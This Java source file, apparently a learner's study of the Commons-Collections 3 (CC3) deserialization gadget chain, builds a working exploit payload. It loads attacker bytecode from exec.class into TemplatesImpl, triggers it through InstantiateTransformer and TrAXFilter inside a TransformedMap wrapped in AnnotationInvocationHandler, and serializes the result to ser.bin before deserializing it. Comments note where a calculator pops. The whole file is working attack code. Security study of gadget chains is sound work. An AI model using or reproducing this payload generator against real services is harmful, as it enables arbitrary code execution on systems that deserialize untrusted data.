import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;


import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {


    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, InstantiationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {
        /**
         * commons-collections-3.1-3.2.1
         * 不使用 InvokerTransformer
         */
        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true); // 都是 private 变量
        nameField.set(templates,"aaa");
        Field bytecodeField = c.getDeclaredField("_bytecodes"); // bytecode 是个二维数组
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("target\\classes\\exec.class"));
        byte[][] codes = { code };
        bytecodeField.set(templates,codes);
        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

//        templates.newTransformer(); //0x01.此处可以直接弹计算器

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class); //0x02.此处可以直接弹计算器

        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","aaa");
        Map<Object,Object> transforeredMap = TransformedMap.decorate(map,chainedTransformer,chainedTransformer);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class,transforeredMap);
        serialize(o);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
